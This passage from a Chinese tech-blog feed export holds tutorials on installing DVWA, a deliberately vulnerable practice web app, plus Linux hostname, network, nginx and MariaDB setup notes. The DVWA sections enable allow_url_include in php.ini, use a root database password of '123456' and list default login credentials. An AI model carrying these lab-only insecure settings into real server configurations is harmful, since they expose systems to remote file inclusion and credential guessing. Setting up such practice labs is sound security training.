exit</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译一个配置文件，测试是否支持php</span></span><br><span class="line">[root@VM-4-16-centos ~]# vim /var/www/html/test.php </span><br><span class="line"></span><br><span class="line">-- 下面是内容</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello Kali!&quot;;</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><p>就上面那些，足够了。</p><h2 id="apache部分服务器配置文件介绍"><a href="#apache部分服务器配置文件介绍" class="headerlink" title="apache部分服务器配置文件介绍"></a>apache部分服务器配置文件介绍</h2><table><thead><tr><th>文件名称</th><th>作用</th></tr></thead><tbody><tr><td>/etc/httpd</td><td>服务目录</td></tr><tr><td>/etc/httpd/conf/httpd.conf</td><td>主配置文件</td></tr><tr><td>/var/www/html</td><td>网站数据目录</td></tr><tr><td>/var/log/httpd/access_log</td><td>访问日志</td></tr><tr><td>/var/log/httpd/error_log</td><td>错误日志</td></tr><tr><td>/etc/httpd/conf.d</td><td>附加模块配置文件</td></tr><tr><td>/etc/httpd/modules</td><td>模块文件路径链接</td></tr><tr><td>/etc/httpd/bin/</td><td>二进制命令</td></tr><tr><td>/etc/httpd/logs</td><td>默认日志文件位置</td></tr></tbody></table><h2 id="部分参数对应的解释"><a href="#部分参数对应的解释" class="headerlink" title="部分参数对应的解释"></a>部分参数对应的解释</h2><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>ServerRoot</td><td>服务目录</td></tr><tr><td>ServerAdmin</td><td>管理员邮箱</td></tr><tr><td>User</td><td>运行服务的用户</td></tr><tr><td>Group</td><td>运行服务的用户组</td></tr><tr><td>ServerName</td><td>网站服务器的域名</td></tr><tr><td>DocumentRoot</td><td>网站数据目录</td></tr><tr><td>Listen</td><td>监听的IP地址与端口号</td></tr><tr><td>DirectoryIndex</td><td>默认的索引页页面</td></tr><tr><td>Errorlog</td><td>错误日志文件</td></tr><tr><td>Customlog</td><td>访问日志文件</td></tr><tr><td>Timeout</td><td>网页超时时间，默认为300s</td></tr></tbody></table><p>其他补充</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启httpd</span></span><br><span class="line">[root@VM-4-16-centos ~]# service httpd restart</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载php的办法：</span></span><br><span class="line">[root@VM-4-16-centos ~]# yum remove php-common</span><br><span class="line">[root@VM-4-16-centos ~]# yum remove php</span><br><span class="line">查看是否还存在php</span><br><span class="line">[root@VM-4-16-centos ~]# /usr/bin/php -v</span><br></pre></td></tr></table></figure><h1 id="配置DVWA"><a href="#配置DVWA" class="headerlink" title="配置DVWA"></a>配置DVWA</h1><p>DVWA来源：<a href="https://github.com/digininja/DVWA/blob/master/README.zh.md">https://github.com/digininja/DVWA/blob/master/README.zh.md</a></p><p>点下下载按钮就行，上面还有切换为中文的按钮。</p><p>想办法上传到自己的服务器。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压文件</span></span><br><span class="line">[root@VM-4-16-centos /]# cd /var/www/html</span><br><span class="line">[root@VM-4-16-centos html]# unzip DVWA-master_3.zip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改权限(DVWA-master是解压出来的目录)</span></span><br><span class="line">[root@VM-4-16-centos html]# chown apache:apache DVWA-master </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line">[root@VM-4-16-centos html]# cd DVWA-master/config</span><br><span class="line">[root@VM-4-16-centos config]# cp config.inc.php.dist config.inc.php # 先复制一份</span><br><span class="line">[root@VM-4-16-centos config]# vi config.inc.php # 修改文件内容</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;root&#x27;</span>;   <span class="comment"># 数据库的用户名</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;123456&#x27;</span>; <span class="comment"># 数据库的密码</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;db_port&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ]  = <span class="string">&#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;</span>;</span></span><br></pre></td></tr></table></figure><p>修改对应的php配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-4-16-centos /]# cd /var/www/html/DVWA-master/config</span><br><span class="line">[root@VM-4-16-centos config]# vi php.ini</span><br><span class="line"></span><br><span class="line">magic_quotes_gpc = Off</span><br><span class="line">allow_url_fopen = on</span><br><span class="line">allow_url_include = on</span><br><span class="line"></span><br><span class="line">[root@VM-4-16-centos config]# vi /etc/php.ini</span><br><span class="line"></span><br><span class="line">allow_url_fopen = on</span><br><span class="line">allow_url_include = on</span><br></pre></td></tr></table></figure><p>修改完成后就可以尝试登录了。 url框输入你配置的IP地址(监听端口默认80端口，有需要可以在阿帕奇的配置文件改掉)</p><p>下面是完成了的<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-02/cs-1.jpg?raw=true" alt="&quot;over&quot;"></p><p>DVWA默认内置账户</p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>admin</td><td>password</td></tr><tr><td>gordonb</td><td>abc123</td></tr><tr><td>1337</td><td>charley</td></tr><tr><td>pablo</td><td>letmein</td></tr><tr><td>smithy</td><td>password</td></tr></tbody></table><p><strong>搭建环境的教训</strong> ：在系统本身已经配置LNMP的前提下，可以直接备份一个镜像，然后将系统重置为初始状态再配置，避免出现冲突或者不必要的麻烦。（吃一堑长一智了属实……）</p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> Server </tag>
            
            <tag> 靶场 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建DVWA-Windows</title>
      <link href="/2023/02/19/DVWA-Study-01/"/>
      <url>/2023/02/19/DVWA-Study-01/</url>
      
        <content type="html"><![CDATA[<p>Windows 搭建DVWA的简易流程</p><span id="more"></span><h1 id="小皮面板"><a href="#小皮面板" class="headerlink" title="小皮面板"></a>小皮面板</h1><p>下载并且安装面板<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-00.jpg?raw=true" alt="download"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-01.jpg?raw=true" alt="download"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-02.jpg?raw=true" alt="download"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-05.jpg?raw=true" alt="download"><br>下面能成功访问表示安装成功了<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-03.jpg?raw=true" alt="download"></p><h1 id="DVWA安装"><a href="#DVWA安装" class="headerlink" title="DVWA安装"></a>DVWA安装</h1><p>DVWA来源：<a href="https://github.com/digininja/DVWA/blob/master/README.zh.md">https://github.com/digininja/DVWA/blob/master/README.zh.md</a><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-04.jpg?raw=true" alt="download"></p><p>下载完成后，解压到面板的www目录下</p><p>配置dvwa中配置文件</p><p>将config文件中的config.inc.php.dist，复制一份在这个目录下，更改名字为config.inc.php，然后修改里面数据库的配置信息：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;db_server&#x27;</span>]   = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;db_database&#x27;</span>] = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;db_user&#x27;</span>]     = <span class="string">&#x27;root&#x27;</span>; <span class="comment"># 对应你的面板数据库的root账户信息</span></span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;db_password&#x27;</span>] = <span class="string">&#x27;123456&#x27;</span>; <span class="comment"># 对应你的面板的数据库的root账户密码</span></span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;db_port&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ReCAPTCHA settings</span></span><br><span class="line"><span class="comment">#   Used for the &#x27;Insecure CAPTCHA&#x27; module</span></span><br><span class="line"><span class="comment">#   You&#x27;ll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_public_key&#x27;</span>]  = <span class="string">&#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>] = <span class="string">&#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改dvwa的php.ini文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">magic_quotes_gpc = Off</span><br><span class="line">allow_url_fopen = on    <span class="comment"># 注意！这里的选项需要在小皮面板自带的php文件当中找到php.ini并且做出修改</span></span><br><span class="line">allow_url_include = on  <span class="comment"># 注意！这里的选项需要在小皮面板自带的php文件当中找到php.ini并且做出修改</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-07.jpg?raw=true" alt="download"></p><p>接下来，使用网址 <strong>localhost/DVWA</strong> 直接打开，当然，DVWA是你解压出来的DVWA目录，别出错了。<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-08.jpg?raw=true" alt="download"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">默认账户密码</span><br><span class="line">账户：admin</span><br><span class="line">密码：password</span><br></pre></td></tr></table></figure><p><img src="c-10.jpg?raw=true" alt="download"><br><img src="c-11.jpg?raw=true" alt="download"><br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/DVWA-Study-01/c-12.jpg?raw=true" alt="download"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> SEC </tag>
            
            <tag> Server </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务配置-学习日志-001</title>
      <link href="/2023/02/18/Linux-Server-Study-001/"/>
      <url>/2023/02/18/Linux-Server-Study-001/</url>
      
        <content type="html"><![CDATA[<p>下面是关于Linux 服务配置教程的学习日志</p><span id="more"></span><h1 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h1><p>主机名在同一网络中是唯一的，且主机名分为三种形式（CentOS 7）：</p><ol><li><strong>静态的（Static）</strong> ：“静态”主机名也称为内核主机名，是系统在启动时从/etc/hostname自动初始化的主机名。</li><li><strong>瞬态的（Transient）</strong> ：“瞬态”主机名是在系统运行时临时分配的主机名，由内核管理。<br>例如，通过 DHCP 或 DNS 服务器分配的 localhost 就是这种形式的主机名。</li><li><strong>灵活的（Pretty）</strong> ：“灵活”主机名是 UTF8 格式的自由主机名，以展示给终端用户。</li></ol><h2 id="查看当前主机名"><a href="#查看当前主机名" class="headerlink" title="查看当前主机名"></a>查看当前主机名</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">简单查询当前静态主机名</span></span><br><span class="line">[root@localhost ~] # hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询主机名</span></span><br><span class="line">[root@localhost ~] # hostnamectl</span><br><span class="line">   Static hostname: localhost.localdomain -- 静态主机名</span><br><span class="line">         Icon name: computer-vm -- 瞬态主机名</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: 9f9654d324b14985a08b035dbf71b5d4</span><br><span class="line">           Boot ID: 719dfd7869d249b09136b8ad6d3b36d0</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-1127.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br></pre></td></tr></table></figure><h2 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h2><h3 id="编辑主机名文件修改-静态"><a href="#编辑主机名文件修改-静态" class="headerlink" title="编辑主机名文件修改(静态)"></a>编辑主机名文件修改(静态)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~] # vi /etc/hostname</span><br><span class="line"></span><br><span class="line">----- 下面是文件内容</span><br><span class="line">localhost.localdomain --文件只有一行，且放着静态主机名，修改为想要的主机名即可</span><br><span class="line"></span><br><span class="line">-- 修改完成后，保存文件并且退出，输入下面的命令重启服务</span><br><span class="line">[root@localhost ~] # systemctl restart systemd-hostnamed</span><br></pre></td></tr></table></figure><h3 id="Network-Manager-TUI修改-静态"><a href="#Network-Manager-TUI修改-静态" class="headerlink" title="Network Manager TUI修改(静态)"></a>Network Manager TUI修改(静态)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~] # nmtui</span><br></pre></td></tr></table></figure><p><img src="cs-01.jpg" alt="&quot;Linux01&quot;"><br><img src="cs-02.jpg" alt="&quot;Linux01&quot;"><br>后面只需回车点OK就修改完成了。<br><img src="cs-03.jpg" alt="&quot;Linux01&quot;"></p><h3 id="hostnamectl修改-静态"><a href="#hostnamectl修改-静态" class="headerlink" title="hostnamectl修改(静态)"></a>hostnamectl修改(静态)</h3><p>hostnamectl参数说明</p><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-H –host=[USER@]HOST</td><td>操作远程主机</td></tr><tr><td>status</td><td>查看当前主机名(和直接使用hostnamectl一样的效果)</td></tr><tr><td><strong>set-hostname</strong></td><td>设置主机名</td></tr><tr><td>set-icon-name</td><td>为主机设置图标名称</td></tr><tr><td>set-chassis</td><td>为主机设置机箱类型</td></tr><tr><td>set-deployment</td><td>为主机设置部署环境</td></tr><tr><td>set-location</td><td>为主机设置位置</td></tr></tbody></table><p>只需要下面一行即可修改主机名(静态)为syw002</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hostnamectl set-hostname syw002</span></span><br></pre></td></tr></table></figure><h3 id="hostname修改主机名-瞬态"><a href="#hostname修改主机名-瞬态" class="headerlink" title="hostname修改主机名(瞬态)"></a>hostname修改主机名(瞬态)</h3><p><img src="cs-04.jpg" alt="&quot;Linux01&quot;"></p><!-- # 配置IP地址、默认网关和域名服务器 --><h1 id="网卡配置文件"><a href="#网卡配置文件" class="headerlink" title="网卡配置文件"></a>网卡配置文件</h1><p>在配置网卡前，请先确保同一网络段内宿主机的网卡IP地址不会与虚拟机的网卡IP地址冲突。</p><p>宿主机命令行输入ipconfig查看网卡IP地址即可。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost /]# ls //etc/sysconfig/network-scripts/ifcfg* #查看当前的网卡有多少个</span><br><span class="line">ifcfg-ens32 # 本机网卡配置文件，可以有多个网卡，例如ifcfg-ens34等</span><br><span class="line">ifcfg-lo    # 环回地址loopback的配置文件</span><br><span class="line"></span><br><span class="line">[root@localhost /]# cat /etc/sysconfig/network-scripts/ifcfg-ens32#查看网卡信息</span><br><span class="line"></span><br><span class="line">TYPE=Ethernet#网卡类型：以太网</span><br><span class="line">PROXY_METHOD=none#代理方式：关闭</span><br><span class="line">BROWSER_ONLY=no  #只是浏览器：否</span><br><span class="line">BOOTPROTO=dhcp#网卡配置方式：dhcp（自动获取ip）</span><br><span class="line">DEFROUTE=yes#默认路由：开启</span><br><span class="line">IPV4_FAILURE_FATAL=no#IPV4致命错误检测：不开启</span><br><span class="line">IPV6INIT=yes#自动初始化IPV6：是</span><br><span class="line">IPV6_AUTOCONF=yes#自动配置IPV6：是</span><br><span class="line">IPV6_DEFROUTE=yes#IPV6默认路由：不开启</span><br><span class="line">IPV6_FAILURE_FATAL=no#IPV6致命错误检测：不开启</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy#IPV6生成“stable-privacy”的模型</span><br><span class="line">NAME=ens32#网卡别名</span><br><span class="line">UUID=7a2ccac9-7a0c-46cb-abd2-fe82ead125bb#唯一标识码</span><br><span class="line">DEVICE=ens32#网卡名称</span><br><span class="line">ONBOOT=no#是否要设置为开机启动</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">&quot;/etc/sysconfig/network-scripts/ifcfg-ens32&quot; 15L, 279C</span><br></pre></td></tr></table></figure><h2 id="到网卡配置文件修改"><a href="#到网卡配置文件修改" class="headerlink" title="到网卡配置文件修改"></a>到网卡配置文件修改</h2><p>当 <strong>BOOTPROTO=none</strong> 时，需要配置以下参数：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ONBOOT=yes # 是否要设置为开机启动</span><br><span class="line">IPADDR=192.168.232.10 # IP地址</span><br><span class="line">PREFIX/NETMASK=24/255.255.255.0 # 网络前缀/子网掩码</span><br><span class="line">GETEWAY=192.168.232.1 # 默认网关</span><br><span class="line">DNS1=192.168.232.1 # DNS首选服务器</span><br><span class="line"></span><br><span class="line">-- 配置完成后，重启服务network</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl restart network</span></span><br><span class="line"></span><br><span class="line">-- 查询指定网卡的配置信息</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ifconfig ens32</span></span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.232.10  netmask 255.255.255.0  broadcast 192.168.232.255</span><br><span class="line">        inet6 fe80::695c:2d35:b2de:c0e4  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:72:dd:e8  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 28  bytes 5090 (4.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 43  bytes 5554 (5.4 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><h2 id="Network-Manager-TUI修改"><a href="#Network-Manager-TUI修改" class="headerlink" title="Network Manager TUI修改"></a>Network Manager TUI修改</h2><p>具体看下图：</p><p><img src="cs-04.jpg" alt="&quot;Linux2&quot;"><br><img src="cs-05.jpg" alt="&quot;Linux2&quot;"><br><img src="cs-06.jpg" alt="&quot;Linux2&quot;"><br><img src="cs-07.jpg" alt="&quot;Linux2&quot;"><br><img src="cs-08.jpg" alt="&quot;Linux2&quot;"><br><img src="cs-09.jpg" alt="&quot;Linux2&quot;"></p><h2 id="nmcli"><a href="#nmcli" class="headerlink" title="nmcli"></a>nmcli</h2><h3 id="子命令功能"><a href="#子命令功能" class="headerlink" title="子命令功能"></a>子命令功能</h3><p>参照书上：</p><table><thead><tr><th>子命令</th><th>功能</th></tr></thead><tbody><tr><td>nmcli connection add help</td><td>查看帮助</td></tr><tr><td>nmcli connection reload</td><td>重新加载配置</td></tr><tr><td>nmcli connection show</td><td>显示所有连接</td></tr><tr><td>nmcli connection show “ensXX”</td><td>显示连接 ensXX</td></tr><tr><td>nmcli connection show –active</td><td>显示所有活动的连接状态</td></tr><tr><td>nmcli connection up con-XX</td><td>启用 con-XX 的配置</td></tr><tr><td>nmcli connection down con-XX</td><td>禁用 con-XX 的配置，注意一个网卡可以有多个配置</td></tr><tr><td>nmeli device connect ensXX</td><td>启用网卡 ensXX</td></tr><tr><td>nmcli device disconneet ensXX</td><td>禁用网卡 ensXX</td></tr><tr><td>nmcli device show ensXX</td><td>显示网卡 ensXX</td></tr><tr><td>nmcli device status</td><td>显示设备状态</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下面时修改关网卡的部分</span></span><br><span class="line">[root@localhost test]<span class="comment"># nmcli connection modify ens33 ipv4.method manual ipv4.addresses 192.168.122.164/24 gw4  192.168.122.1 ipv4.dns 192.168.122.1</span></span><br><span class="line"></span><br><span class="line">nmcli: NetworkManager 命令行工具。</span><br><span class="line">connection: nmcli 命令中用于管理网络连接的子命令。</span><br><span class="line">modify: nmcli connection 子命令的选项，用于修改网络连接的配置。</span><br><span class="line">ens33: 需要修改配置的网络连接名称。</span><br><span class="line">ipv4.method manual: 将 IPv4 地址设置为手动配置模式。</span><br><span class="line">ipv4.addresses <span class="number">192.168</span>.<span class="number">122.164</span>/<span class="number">24</span>: 配置 ens33 网络接口的 IPv4 地址为 <span class="number">192.168</span>.<span class="number">122.164</span>/<span class="number">24</span>，其中 /<span class="number">24</span> 表示子网掩码为 <span class="number">255.255</span>.<span class="number">255.0</span>。</span><br><span class="line">gw4 <span class="number">192.168</span>.<span class="number">122.1</span>: 设置网关的 IPv4 地址为 <span class="number">192.168</span>.<span class="number">122.1</span>。</span><br><span class="line">ipv4.dns <span class="number">192.168</span>.<span class="number">122.1</span>: 将 DNS 服务器的 IPv4 地址设置为 <span class="number">192.168</span>.<span class="number">122.1</span>。</span><br></pre></td></tr></table></figure><h3 id="常用选项含义表"><a href="#常用选项含义表" class="headerlink" title="常用选项含义表"></a>常用选项含义表</h3><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>con-name</td><td>指定连接名字,没有特殊要求,建议使用英文和数字,中间不要有空格</td></tr><tr><td>ipv4.method</td><td>指定获取 IP 地址的方式</td></tr><tr><td>ifname</td><td>指定网卡设备名</td></tr><tr><td>autoconnect</td><td>指定是否自动启动</td></tr><tr><td>gw4</td><td>指定IPv4 网关</td></tr></tbody></table><h3 id="nmcli命令选项参数和网卡配置文件字段的对应关系"><a href="#nmcli命令选项参数和网卡配置文件字段的对应关系" class="headerlink" title="nmcli命令选项参数和网卡配置文件字段的对应关系"></a>nmcli命令选项参数和网卡配置文件字段的对应关系</h3><table><thead><tr><th>nmcli命令选项参数</th><th>网卡配置文件字段</th></tr></thead><tbody><tr><td>ipv4.method manual/auto</td><td>BOOTPROTO=none/dhcp</td></tr><tr><td>connection.id ensXX</td><td>NAME= ensXX</td></tr><tr><td>connection.interface-name ensXX</td><td>DEVICE=ensXX</td></tr><tr><td>conneetion.autoconnect yes</td><td>ONBOOT=yes</td></tr><tr><td>ipv4.addresses 192,168.0.1/24</td><td>IPADDR=192.168.0.1<br>PREFIX-24</td></tr><tr><td>gw4 192.168.0.254</td><td>GATEWAY=192.168.0.254</td></tr><tr><td>ipv4.dns 8.8.8.8</td><td>DNS1=8.8.8.8</td></tr><tr><td>ipv4.dns-search example.com</td><td>DOMAIN=example.com</td></tr><tr><td>ipy4.ignore-auto-dns true</td><td>PEERDNS= no</td></tr><tr><td>802-3-ethernet.mac-address…</td><td>HWADDR=…</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Server </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LNMP-配置</title>
      <link href="/2023/02/17/LNMP-Study-02/"/>
      <url>/2023/02/17/LNMP-Study-02/</url>
      
        <content type="html"><![CDATA[<p>基于上一篇博客<a href="https://linxiao-wangchuan.github.io/2023/02/16/LNMP-study/">LNMP-搭建且安装php/nginx/mysql </a>进行下面的操作。</p><span id="more"></span><h1 id="管理nginx"><a href="#管理nginx" class="headerlink" title="管理nginx"></a>管理nginx</h1><h2 id="简易操作脚本-个人想法，有点费劲"><a href="#简易操作脚本-个人想法，有点费劲" class="headerlink" title="简易操作脚本(个人想法，有点费劲)"></a>简易操作脚本(个人想法，有点费劲)</h2><p>前面提到的，为了方便，使用“runPHP”取代繁琐的启动操作，下面再补充点NGINX和mysql的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 简化下启动nginx的流程</span><br><span class="line"></span><br><span class="line">-- 第一个：启动</span><br><span class="line"># cd /</span><br><span class="line"># vi nginx-start.sh</span><br><span class="line"></span><br><span class="line">-- 下面是内容</span><br><span class="line">​​​​​​​/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">-- 到此处完成编辑，点击大写的Caps lock，再双击z字符保存并且退出</span><br><span class="line"></span><br><span class="line">-- 运行</span><br><span class="line">/nginx-start.sh</span><br><span class="line"></span><br><span class="line">-- 第二个：关闭和重启</span><br><span class="line">-- 软连接</span><br><span class="line"># cd /</span><br><span class="line"># ln -s /usr/local/nginx/sbin/nginx nginx</span><br><span class="line"># /nginx -s stop  -- 关闭  </span><br><span class="line"># /nginx -s quit -- 安全退出</span><br><span class="line"># /nginx -s reload -- 重启</span><br><span class="line"># /nginx -t -- 查看状态</span><br><span class="line"># ps aux|grep nginx  查看nginx进程</span><br></pre></td></tr></table></figure><h2 id="systemctl服务管理"><a href="#systemctl服务管理" class="headerlink" title="systemctl服务管理"></a>systemctl服务管理</h2><p>另外一种比较便捷的开启办法：</p><p>添加nginx系统服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@syw ~]# vi /etc/init.d/nginx</span><br><span class="line">#!/bin/bash</span><br><span class="line"># chkconfig: - 35 20 80</span><br><span class="line"># description: Nginx Service Control Script</span><br><span class="line">PROG=&quot;/usr/local/nginx/sbin/nginx&quot;</span><br><span class="line">PIDF=&quot;/usr/local/nginx/logs/nginx.pid&quot;</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">        $PROG</span><br><span class="line">        ;;</span><br><span class="line">  stop)</span><br><span class="line">        kill -s QUIT $(cat $PIDF)</span><br><span class="line">        ;;</span><br><span class="line">  restart)</span><br><span class="line">        $0 stop</span><br><span class="line">        $0 start</span><br><span class="line">        ;;</span><br><span class="line">  reload)</span><br><span class="line">        kill -s HUP $(cat $PIDF)</span><br><span class="line">        ;;</span><br><span class="line">  *)</span><br><span class="line">        echo &quot;Usage:$0 &#123;start|stop|restart|reload&#125;&quot;</span><br><span class="line">        exit 1</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line">[root@syw ~]# chmod +x /etc/init.d/nginx </span><br><span class="line">[root@syw ~]# chkconfig --add nginx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再通过systemctl命令对Nginx服务的管理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># systemctl start nginx -- 开启</span><br><span class="line"># systemctl stop nginx -- 关闭</span><br></pre></td></tr></table></figure><h3 id="关于防火墙"><a href="#关于防火墙" class="headerlink" title="关于防火墙"></a>关于防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启service firewalld start</span><br><span class="line"># 重启service firewalld restart</span><br><span class="line"># 关闭service firewalld stop</span><br><span class="line"># 查看防火墙规则firewall-cmd --list-all</span><br><span class="line"># 查询端口是否开放firewall-cmd --query-port=8080/tcp</span><br><span class="line"># 开放80端口firewall-cmd --permanent --add-port=80/tcp</span><br><span class="line"># 移除端口firewall-cmd --permanent --remove-port=8080/tcp#重启防火墙(修改配置后要重启防火墙)firewall-cmd --reload</span><br><span class="line"># 参数解释1、firwall-cmd：是Linux提供的操作firewall的一个工具；2、--permanent：表示设置为持久；3、--add-port：标识添加的端口；</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="管理mysql"><a href="#管理mysql" class="headerlink" title="管理mysql"></a>管理mysql</h1><p>个人脚本制作</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vi /mysqlstart.sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">systemctl start mariadb.service </span><br><span class="line">systemctl enable mariadb.service</span><br><span class="line"></span><br><span class="line">-- 保存退出</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chomd u+x /mysqlstart.sh</span></span><br><span class="line">-- 执行脚本</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/mysqlstart.sh</span></span><br></pre></td></tr></table></figure><h1 id="建立关联php和nginx-mysql"><a href="#建立关联php和nginx-mysql" class="headerlink" title="建立关联php和nginx/mysql"></a>建立关联php和nginx/mysql</h1><h2 